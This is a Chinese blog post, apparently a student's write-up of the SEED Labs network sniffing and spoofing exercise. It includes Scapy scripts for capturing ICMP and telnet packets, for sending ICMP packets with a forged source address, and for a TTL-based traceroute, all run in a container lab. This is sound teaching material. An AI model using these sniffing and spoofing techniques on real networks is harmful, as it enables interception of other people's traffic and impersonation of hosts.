<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SEEDLAB：网络嗅探攻击实验 | Enboy_Yu's blog</title><meta name="keywords" content="seedlab 嗅探攻击"><meta name="author" content="Enboy_Yu"><meta name="copyright" content="Enboy_Yu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、    实验目的 1 overview包嗅探和欺骗是网络安全中的两个重要概念；它们是网络通信中的两大威胁。能够理解这两种威胁对于理解网络中的安全措施至关重要。有许多包嗅探和欺骗工具，如Wireshark、Tcpdump、Netwox等。其中一些工具被安全专家以及攻击者广泛使用。能够使用这些工具对学生来说很重要，但对于网络安全课程的学生来说，更重要的是了解这些工具是如何工作的，即包嗅探和欺骗是">
<meta property="og:type" content="article">
<meta property="og:title" content="SEEDLAB：网络嗅探攻击实验">
<meta property="og:url" content="https://02lxc.github.io/post/4f4694a6.html">
<meta property="og:site_name" content="Enboy_Yu&#39;s blog">
<meta property="og:description" content="一、    实验目的 1 overview包嗅探和欺骗是网络安全中的两个重要概念；它们是网络通信中的两大威胁。能够理解这两种威胁对于理解网络中的安全措施至关重要。有许多包嗅探和欺骗工具，如Wireshark、Tcpdump、Netwox等。其中一些工具被安全专家以及攻击者广泛使用。能够使用这些工具对学生来说很重要，但对于网络安全课程的学生来说，更重要的是了解这些工具是如何工作的，即包嗅探和欺骗是">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&h=187&c=7&r=0&o=5&dpr=1.6&pid=1.7">
<meta property="article:published_time" content="2024-01-31T06:11:05.377Z">
<meta property="article:modified_time" content="2024-01-31T09:02:28.832Z">
<meta property="article:author" content="Enboy_Yu">
<meta property="article:tag" content="seedlab 嗅探攻击">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&h=187&c=7&r=0&o=5&dpr=1.6&pid=1.7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://02lxc.github.io/post/4f4694a6"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-01-31 17:02:28'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="C:\blog-demo\node_modules\hexo-theme-butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Enboy_Yu's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SEEDLAB：网络嗅探攻击实验</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-31T06:11:05.377Z" title="发表于 2024-01-31 14:11:05">2024-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-31T09:02:28.832Z" title="更新于 2024-01-31 17:02:28">2024-01-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/seedlab/">seedlab</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SEEDLAB：网络嗅探攻击实验"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a name="cIZ0i"></a></p>
<h1 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、    实验目的"></a>一、    实验目的</h1><p><a name="Juc2u"></a></p>
<h2 id="1-overview"><a href="#1-overview" class="headerlink" title="1 overview"></a>1 overview</h2><p>包嗅探和欺骗是网络安全中的两个重要概念；它们是网络通信中的两大威胁。能够理解这两种威胁对于理解网络中的安全措施至关重要。有许多包嗅探和欺骗工具，如Wireshark、Tcpdump、Netwox等。其中一些工具被安全专家以及攻击者广泛使用。能够使用这些工具对学生来说很重要，但对于网络安全课程的学生来说，更重要的是了解这些工具是如何工作的，即包嗅探和欺骗是如何在软件中实现的。</p>
<p>本实验的目标是让学生掌握大多数嗅探和欺骗工具的基本技术。学生们将使用一些简单的嗅探和欺骗程序，阅读它们的源代码，修改它们，并最终对这些程序的技术方面有深入的了解。在本实验结束时，学生应该能够编写自己的嗅探和欺骗程序。<br><a name="vg0k9"></a></p>
<h1 id="二、-实验步骤及结果"><a href="#二、-实验步骤及结果" class="headerlink" title="二、    实验步骤及结果"></a>二、    实验步骤及结果</h1><p><a name="STc8I"></a></p>
<h2 id="2-Environment-Setup-using-Container"><a href="#2-Environment-Setup-using-Container" class="headerlink" title="2 Environment Setup using Container"></a><strong>2 Environment Setup using Container</strong></h2><blockquote>
<p>在这个实验室中，我们将使用三台连接到同一局域网的机器。我们可以使用三个虚拟机或三个容器。图1描述了使用容器进行的实验室环境设置。我们将对攻击者容器进行所有攻击，同时使用其他容器作为用户机器。</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699860910845-2ccde31b-8af6-43eb-a242-fef37ad74536.png#averageHue=%23f2f2f1&clientId=u57db4859-e4a5-4&from=paste&height=206&id=u3718af4b&originHeight=324&originWidth=759&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=63372&status=done&style=none&taskId=u37726827-2de3-40f9-94f7-3a679a957ba&title=&width=481.90478378953406" alt="image.png"><br><a name="U5nKd"></a></p>
<h3 id="2-1-Container-Setup-and-Commands"><a href="#2-1-Container-Setup-and-Commands" class="headerlink" title="2.1 Container Setup and Commands"></a><strong>2.1 Container Setup and Commands</strong></h3><p>在labsetup文件夹下，启动docker</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ dcbuild   <span class="comment"># 构建容器映像</span></span><br><span class="line">$ dcup      <span class="comment"># 启动容器</span></span><br><span class="line">$ dcdown    <span class="comment"># 关闭容器(这个命令现在不用)</span></span><br></pre></td></tr></table></figure>

<p>要在容器上运行命令的话，我们通常需要在该容器上获取一个shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dockps      <span class="comment"># Alias for: docker ps --format &quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span></span><br><span class="line">$ docksh &lt;<span class="built_in">id</span>&gt; <span class="comment"># Alias for: docker exec -it &lt;id&gt; /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>我在这里先连接上docker<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699866265114-f7a637d4-f999-4b9e-acfe-00d87d191aa9.png#averageHue=%23110f0d&clientId=u57db4859-e4a5-4&from=paste&height=166&id=ud2e6cdce&originHeight=262&originWidth=1055&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=69427&status=done&style=none&taskId=ud5c58271-3b6d-4a27-a0d7-d3ef1f75704&title=&width=669.8413002608148" alt="image.png"><br><a name="Habcl"></a></p>
<h3 id="2-2-About-the-Attacker-Container"><a href="#2-2-About-the-Attacker-Container" class="headerlink" title="2.2 About the Attacker Container"></a><strong>2.2 About the Attacker Container</strong></h3><p>在这个实验室中，攻击者需要能够嗅探包，但运行嗅探程序容器有问题，因为容器有效地连接到一个虚拟开关，所以它只能看到自己的流量，它永远不会看到其他容器中的数据包。为了解决这个问题，我们使用了攻击者容器的主机模式。这允许攻击者容器查看所有的流量。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699862046796-34d40ca0-6038-4889-817f-b9c55814149f.png#averageHue=%2323201f&clientId=u57db4859-e4a5-4&from=paste&height=230&id=uf3584fee&originHeight=362&originWidth=647&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=30031&status=done&style=none&taskId=uacb9c441-0b90-4c1d-85b5-f916e649675&title=&width=410.79366944904945" alt="image.png"><br />当容器处于主机模式时，它可以看到所有主机的网络接口，它甚至具有与主机具有相同的IP地址。基本上，它与主机虚拟机放在相同的网络名称空间中。但是，容器仍然是一个独立的机器，因为它的其他名称空间仍然与主机不同。<br><a name="vTOH6"></a></p>
<h2 id="3-Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets"><a href="#3-Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets" class="headerlink" title="3 Lab Task Set 1: Using Scapy to Sniff and Spoof Packets"></a><strong>3 Lab Task Set 1: Using Scapy to Sniff and Spoof Packets</strong></h2><p><a name="gGXYT"></a></p>
<h3 id="3-1-Task-1-1-Sniffifing-Packets"><a href="#3-1-Task-1-1-Sniffifing-Packets" class="headerlink" title="3.1: Task 1.1: Sniffifing Packets"></a>3.1: <strong>Task 1.1: Sniffifing Packets</strong></h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699880971983-e33d79c0-c5ee-4106-a1ea-c0f194069152.png#averageHue=%232a2726&clientId=u35912d60-0bf6-4&from=paste&height=177&id=u5979a789&originHeight=278&originWidth=926&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=47588&status=done&style=none&taskId=u6eb574d0-4a28-407e-97ce-795c51010cd&title=&width=587.9365346365066" alt="image.png"><br />之后实现简单的sniff程序。所有的container容器共享Labsetup&#x2F;volumes文件夹，可以直接把源代码文件建在这里，在container的&#x2F;volumes底下即可访问。</p>
<p>根据实验文档在&#x2F;volumes下建立sniff.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line">    pkt.show()</span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-9ae40e75e337&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;icmp&#x27;</span>, prn=print_pkt)</span><br></pre></td></tr></table></figure>
<p>上面的代码将嗅出br-9ae40e75e337接口上的数据包。请阅读实验室设置部分中关于如何获取接口名称的说明。如果我们想嗅探多个接口，我们可以将所有接口放在一个列表中，并将其分配给iface。<br><a name="iaZ8p"></a></p>
<h4 id="Task-1-1A"><a href="#Task-1-1A" class="headerlink" title="Task 1.1A"></a><strong>Task 1.1A</strong></h4><blockquote>
<p>在上面的程序中，对于每个捕获的数据包，将调用回调函数打印pkt（）；这个函数将打印出有关数据包的一些信息。使用根权限运行该程序，并证明您确实可以捕获数据包。在此之后，再次运行该程序，但不使用根权限；描述和解释您的观察结果。</p>
</blockquote>
<p>提前在HostA主机上ping 10.9.0.6，即可在Attacker主机上发现捕获的ICMP报文：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699866582906-57b32345-c0e6-47e2-b4f9-ec42f64772e3.png#averageHue=%2314110d&clientId=u57db4859-e4a5-4&from=paste&height=192&id=u9d06f66f&originHeight=313&originWidth=788&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=88797&status=done&style=none&taskId=u3b28dbfb-ef72-4fad-93e8-0c82590f81f&title=&width=482.3174743652344" alt="image.png"><br />使程序可执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> a+x sniffer.py</span><br></pre></td></tr></table></figure>
<p>使用根权限运行该程序</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sniffer.py</span><br></pre></td></tr></table></figure>

<p>可以看到我们嗅探到了以下内容：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699866711747-141dc2b6-190e-47c2-bc25-d9c76081e984.png#averageHue=%23060504&clientId=u57db4859-e4a5-4&from=paste&height=411&id=ub1dc9f90&originHeight=648&originWidth=1160&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=79963&status=done&style=none&taskId=u89cf893a-c8a4-4630-856a-a7d550ae002&title=&width=736.5079699550191" alt="image.png"><br />切换到“种子”帐户，并再次运行程序</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su seed</span><br><span class="line">./sniffer.py</span><br></pre></td></tr></table></figure>
<p>程序会反馈<strong>权限</strong>错误！<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699866811073-b198d1da-12bc-433f-8917-19a1a4f5f265.png#averageHue=%230e0907&clientId=u57db4859-e4a5-4&from=paste&height=216&id=uf55b367f&originHeight=340&originWidth=1163&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=98419&status=done&style=none&taskId=u7014c068-3bf9-4353-9588-99fe92c0584&title=&width=738.4127319462821" alt="image.png"><br><a name="shckK"></a></p>
<h4 id="Task-1-1B"><a href="#Task-1-1B" class="headerlink" title="Task 1.1B"></a><strong>Task 1.1B</strong></h4><p>sniff函数中的filter控制程序会捕获的流量数据，</p>
<ul>
<li><strong>上面的程序只会捕获ICMP数据</strong></li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699866711747-141dc2b6-190e-47c2-bc25-d9c76081e984.png#averageHue=%23060504&from=url&height=308&id=GIewr&originHeight=648&originWidth=1160&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&status=done&style=none&title=&width=551.1111450195312"></p>
<ul>
<li><p><strong>修改filter，使其只捕获来源IP为10.9.0.5，并且目的端口号为23的TCP数据</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter = <span class="string">&#x27;tcp and ip src 10.9.0.5 and dst port 23&#x27;</span></span><br></pre></td></tr></table></figure>
<p>目的端口23为telnet的专用端口号，在HostA上使用命令telnet 10.9.0.1发起请求，该请求将被捕获<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699882378246-e8aec71c-a55b-4caf-85ce-2ff2fd447d85.png#averageHue=%23222020&clientId=u35912d60-0bf6-4&from=paste&height=469&id=ua6ba439b&originHeight=945&originWidth=1111&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=66678&status=done&style=none&taskId=ua71e63c7-361b-466c-8ff6-3a100187da7&title=&width=551.1111450195312" alt="image.png"></p>
</li>
<li><p><strong>修改filter，使其能够拦截任何来自或发往子网128.230.0.0&#x2F;16的流量</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter = <span class="string">&#x27;net 128.230.0.0/16&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>同样在HostA 上ping 128.230.0.5，无论该地址能否正常访问，都应该能够获取到对应的ICMP数据。（一定能收到ICMP请求报文）<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699883199171-e246ff23-7365-47eb-8317-913b27ede525.png#averageHue=%23222121&clientId=u35912d60-0bf6-4&from=paste&height=383&id=u2120a988&originHeight=811&originWidth=1104&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=66903&status=done&style=none&taskId=u519a0723-c263-4445-82a1-db634396b0c&title=&width=521.1111450195312" alt="image.png"></p>
<p><a name="S7od5"></a></p>
<h3 id="3-2-Task-1-2-Spoofifing-ICMP-Packets"><a href="#3-2-Task-1-2-Spoofifing-ICMP-Packets" class="headerlink" title="3.2 Task 1.2: Spoofifing ICMP Packets"></a>3.2 <strong>Task 1.2: Spoofifing ICMP Packets</strong></h3><blockquote>
<p>作为一个包欺骗工具，Scapy允许我们将IP包的字段设置为任意值。此任务的目的是用任意的源IP地址来欺骗IP数据包。我们将欺骗ICMP回波请求数据包，并将它们发送到同一网络上的另一个虚拟机。我们将使用线鲨来观察我们的请求是否会被接收人接受。如果被接受，将发送到欺骗的IP地址。</p>
</blockquote>
<p>修改sniffer.py</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"> </span><br><span class="line">ip = IP()</span><br><span class="line">ip.src = <span class="string">&#x27;128.230.0.5&#x27;</span></span><br><span class="line">ip.dst = <span class="string">&#x27;10.9.0.5&#x27;</span></span><br><span class="line">icmp = ICMP()</span><br><span class="line">send(ip/icmp)</span><br></pre></td></tr></table></figure>
<p>运行该代码<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699964955030-2bab6bfb-a1cf-4ff7-8a11-eaad98b99bdf.png#averageHue=%23232322&clientId=u32c99e94-fdc6-4&from=paste&height=87&id=u00e90935&originHeight=137&originWidth=987&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=18322&status=done&style=none&taskId=u3a600db5-cd1a-4a20-badb-7b77980b4c9&title=&width=626.6666951255206" alt="image.png"><br />在目的主机抓包，能看到攻击方发送了伪造ip为128.230.0.5的包（由前面的实验知128.230.0.5是不可达的）<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699964815435-7a606963-f043-4fb2-8c71-9c08dde6e993.png#averageHue=%23aabca4&clientId=u32c99e94-fdc6-4&from=paste&height=510&id=u6e67d8e5&originHeight=804&originWidth=962&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=208690&status=done&style=none&taskId=ucf6fee95-7ab8-4cfb-b1f4-513a509131d&title=&width=610.7936785316624" alt="image.png"><br><a name="hFfE0"></a></p>
<h3 id="3-3-Task-1-3-Traceroute"><a href="#3-3-Task-1-3-Traceroute" class="headerlink" title="3.3 Task 1.3: Traceroute"></a>3.3 <strong>Task 1.3: Traceroute</strong></h3><blockquote>
<p>此任务的目标是使用Scapy来根据路由器的数量来估计VM和选定的目的地之间的距离。这基本上是由跟踪器工具实现的。在这个任务中，我们将编写我们自己的工具。这个想法非常简单：只需发送一个数据包（任何类型）到目的地，首先将它的实时时间（TTL）字段设置为1。这个数据包将被第一个路由器丢弃，它将向我们发送一个ICMP错误消息，告诉我们上线时间已经超过。这就是我们如何得到第一个路由器的IP地址。然后，我们将TTL字段增加到2，发送另一个数据包，并获得第二个路由器的IP地址。我们将重复这个过程，直到我们的数据包最终到达目的地。需要注意的是，这个实验只得到一个估计的结果，因为理论上，不是所有这些包采取相同的路径（但在实践中，它们可能在短时间内）。下面的代码显示了这个过程中的一轮代码。</p>
</blockquote>
<p>修改sniffer.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):   </span><br><span class="line">    a = IP()</span><br><span class="line">    a.dst = <span class="string">&#x27;110.242.68.4&#x27;</span> <span class="comment"># baidu的IP之一</span></span><br><span class="line">    a.ttl = i</span><br><span class="line">    b = ICMP()</span><br><span class="line">    send(a/b)</span><br></pre></td></tr></table></figure>
<p>在wireshark中开启监听网桥<br />被监听主机运行try_ttl.py后查看wireshark<br /> <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699968285761-7615a3ef-79c2-4c55-86dc-0de7e0d21b7a.png#averageHue=%23263f42&clientId=u32c99e94-fdc6-4&from=paste&height=526&id=u912f7e4e&originHeight=828&originWidth=971&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=256057&status=done&style=none&taskId=uee7a9cf2-c674-4152-9eab-70f4c091675&title=&width=616.5079645054514" alt="image.png"><br><a name="hVwsQ"></a></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><a name="ZKJIr"></a></p>
<h3 id="3-4-Task-1-4-Sniffifing-and-then-Spoofifing"><a href="#3-4-Task-1-4-Sniffifing-and-then-Spoofifing" class="headerlink" title="3.4 Task 1.4: Sniffifing and-then Spoofifing"></a><strong>3.4 Task 1.4: Sniffifing and-then Spoofifing</strong></h3><blockquote>
<p>在此任务中，您将结合嗅探和欺骗技术来实现以下嗅探和欺骗程序。您需要在同一局域网上的两台机器：虚拟机和用户容器。从用户容器中，pingIPX。这将生成ICMP echo请求包。如果X是活动的，ping程序将收到一个回声响应，并打印出响应。你的嗅探-欺骗程序运行在VM上，它通过包嗅探监视局域网。当它看到ICMP echo请求时，无论目标IP地址是什么，您的程序应该立即使用包欺骗技术发送回声回复。因此，无论机器X是否活动，ping程序都将始终收到一个回复，表明X是活动的。您需要使用Scapy来完成此任务。在您的报告中，您需要提供证据来证明您的技术是有效的。</p>
</blockquote>
<p><strong>在被监听主机中ping 以下三个地址，发现只有第三个可以ping通</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700033420661-96cab359-31e8-42a5-8002-3539c46e8aef.png#averageHue=%23292726&clientId=u7ee5117c-c78a-4&from=paste&height=382&id=u0a2754d8&originHeight=601&originWidth=712&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=82925&status=done&style=none&taskId=u38d4daa9-e5c9-4318-af47-0b5bbf908a7&title=&width=452.0635125930807" alt="image.png"></p>
